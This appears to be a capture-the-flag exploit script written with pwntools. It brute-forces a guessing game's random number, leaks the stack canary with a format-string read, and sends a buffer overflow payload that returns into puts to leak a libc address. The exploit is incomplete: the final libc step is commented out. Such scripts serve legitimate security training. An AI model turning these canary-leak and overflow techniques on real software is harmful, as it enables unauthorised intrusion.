""" Solution

    - get_random() - casts the address to the function as a long integer? Only works when returning (also works if you explicitly cast as a long)
    """

""" Post Mortem

    - Tend to gloss over things, should probably a bit more miticulous when reviewing code
    - Create function to grab addresses from a string
    """

from pwn import *
from time import sleep

context.arch = 'i386'
context.binary = 'vuln'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

def get_process():
  proc = process()
  #proc = remote()

  return proc

def attach_gdb(proc):
  gdb.attach(proc, gdbscript="""

  """)
  sleep(1)

def brute_force_rand():
  proc = get_process()

  for i in range(-4094, 4096):
    proc.sendlineafter(b'What number would you like to guess?\n', str(i).encode())
    status = proc.readline()

    if status == b'Congrats! You win! Your prize is this print statement!\n':
      return i

  raise ValueError("Random number could not be found between 1-4096") 

def main():
  proc = get_process()
  attach_gdb(proc)
  plt_puts = p32(context.binary.plt['puts'])
  got_puts = p32(context.binary.got['puts'])
  #libc_exec = p32()

  rand = brute_force_rand()

  canary_offset = str((512//4) + 7)
  #proc.sendlineafter(b'What number would you like to guess?', str(rand).encode())
  #proc.sendlineafter(b'Name', '%p-'*((512//3)))

  proc.sendlineafter(b'What number would you like to guess?', str(rand).encode())
  proc.sendlineafter(b'Name', f'%{canary_offset}$p'.encode())
  canary_value = proc.recvline().decode().strip().split(' ')[-1]
  canary_value = bytearray.fromhex(canary_value[2:])
  canary_value.reverse()

  cyclic = cyclic_gen()
  cyclic.get(128),
  print(cyclic.find(b'baaa'))
  payload = b''.join([
    b'A' * 512,
    canary_value,
    b'A' * 12,
    plt_puts,
    got_puts
  ])

  #print(payload)

  proc.sendlineafter(b'What number would you like to guess?', str(rand).encode())
  proc.sendlineafter(b'Name', payload)

  print(proc.recvline())
  print(proc.recvline())
  print(proc.recvline())
  print(proc.recvline())
  #libc_puts = proc.recvline()
  


if __name__ == '__main__':
  main()
